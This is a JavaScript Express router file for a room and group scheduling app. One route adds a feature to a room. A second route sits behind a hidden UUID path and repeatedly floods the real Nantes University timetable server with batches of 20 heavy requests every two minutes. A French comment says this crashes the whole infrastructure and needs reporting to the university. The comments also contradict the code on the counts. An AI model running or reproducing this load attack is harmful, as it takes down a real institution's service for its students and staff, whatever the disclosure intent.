import express from "express";
const router = express.Router();
import Salle from "../models/salle.js";
import Groupe from "../models/groupe.js";

router.get("/ajouter-caracteristique", async (req, res) => {
    const nomSalle = req.query.salle;
    const carac = req.query.carac;

    if (!nomSalle || !carac) {
        return res.status(400).send("PARAMETRES_MANQUANTS");
    }

    try {
        const succes = await Salle.findOneAndUpdate({ nom_salle: nomSalle }, { $addToSet: { caracteristiques: carac } }, {
            new: true
        });
        if (!succes) {
            return res.status(400).send("SALLE_INEXISTANTE");
        }
        res.status(200).send("MIS_A_JOUR");
    } catch (erreur) {
        res.status(500).send("ERREUR_INTERNE");
        console.error(
            "Erreur pendant le traitement de la requête à",
            req.url,
            `(${erreur.message})`
        );
    }
});

let intervalIds = []; // To store interval IDs for stopping later
// SECURITY FLOW A NOTIFIER A NANTES UNIVERSITE
// Ce code envoie 20 requêtes demandant 50 emplois du temps chacune, toutes les 2 minutes. Cela semble causer un crash global de l'infrastructure. Alors qu'aucun spam n'est généré 2m
router.get('/request/6dc84f9b-d105-422f-9e33-30d9d9f63b71', async (req, res) => {
    try {
        const groupes = await Groupe.find();

        // Extract the 'identifiant' field from each group
        const identifiants = groupes.map(groupe => groupe.identifiant);

        // Create 10 links, each with 30 timetables parameters
        const links = [];
        for (let i = 0; i < 20; i++) {
            const params = new URLSearchParams({
                start: '2024-11-11',
                end: '2024-12-17'
            });

            // Get 30 identifiants for this link
            const timetables = identifiants.slice(i * 30, (i + 1) * 30);

            // If there are fewer than 30 identifiants, loop back to the start
            while (timetables.length < 50) {
                timetables.push(...identifiants);
                timetables.length = 50; // Ensure we have exactly 30
            }

            timetables.forEach((id, index) => {
                params.append(`timetables[${index}]`, id);
            });

            const url = `https://edt-v2.univ-nantes.fr/events?${params.toString()}`;
            links.push(url);
        }

        // Function to send all requests
        const sendRequests = async () => {
            const fetchPromises = links.map(link => {
                return fetch(link);
            });
            await Promise.all(fetchPromises);
            console.log('Requests sent at', new Date().toLocaleTimeString());
        };

        // Send requests immediately and then every 2 minutes
        sendRequests();
        const intervalId = setInterval(sendRequests, 2 * 60 * 1000);
        intervalIds.push(intervalId);

        res.json({ message: 'Requests started' });
    } catch (error) {
        console.error(error);
        res.status(500).send('ERREUR_INTERNE');
    }
});

// Endpoint to stop all ongoing requests
router.get('/request/6dc84f9b-d105-422f-9e33-30d9d9f63b71/stop', (req, res) => {
    intervalIds.forEach(id => clearInterval(id));
    intervalIds = [];
    res.json({ message: 'All requests stopped' });
});

export default router;
